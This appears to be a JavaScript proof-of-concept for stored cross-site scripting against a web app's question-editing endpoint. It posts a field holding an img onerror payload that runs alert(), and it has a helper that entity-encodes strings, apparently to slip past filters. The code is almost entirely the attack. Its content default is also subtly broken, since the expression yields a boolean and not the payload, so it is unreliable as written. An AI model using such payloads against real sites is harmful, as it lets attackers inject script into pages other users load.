function xss(content) {
	this.url = "/?ajax.test.editQuestion",
	this.data = {
		"content":  typeof content !="undefined" || 'title<img src="1" on" onerror="alert(/x/)" />',
		"right": 'right',
		"qid": '47c980353ywR1RAFEBUAYBHxUcCQBVVAlSBAYGVkwTTA',
		"options[]": 'false',
		"status": '0'
	},
	this.callback = function (data) {
		console.log(JSON.parse(data));
	}
}
xss.prototype = {
	post: function () {
		$.post(this.url, this.data, this.callback);
	},
	ch : function (str) {
		return "&#" + str.split("").map(function(data) {return data.charCodeAt();}).join("&#");
	}
}
